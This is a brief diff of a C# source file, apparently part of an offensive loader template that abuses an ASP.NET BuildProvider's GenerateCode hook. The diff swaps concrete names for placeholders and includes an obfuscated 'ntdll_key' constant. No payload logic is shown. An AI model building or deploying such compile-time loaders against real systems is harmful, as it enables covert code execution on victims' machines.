@@ -1,6 +1,5 @@
 using System;
 using System.Web.Compilation;
-using System.Windows.Forms;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -11,7 +10,7 @@ using System.Security.Cryptography;
 using System.Threading;
 using System.Text;
 
-namespace BYOB { 
+namespace BYOBNAMESPACE { 
     public static class ProgramConsts
     {
         public const long ntdll_key = NTDLL_KEY;
@@ -22,7 +21,7 @@ namespace BYOB {
         public const string config_file = "training.data";
     }
 
-    public class BYOBDeath : BuildProvider
+    public class BYOBCLASS : BuildProvider
     {
         public override void GenerateCode(AssemblyBuilder assemblyBuilder)
         {
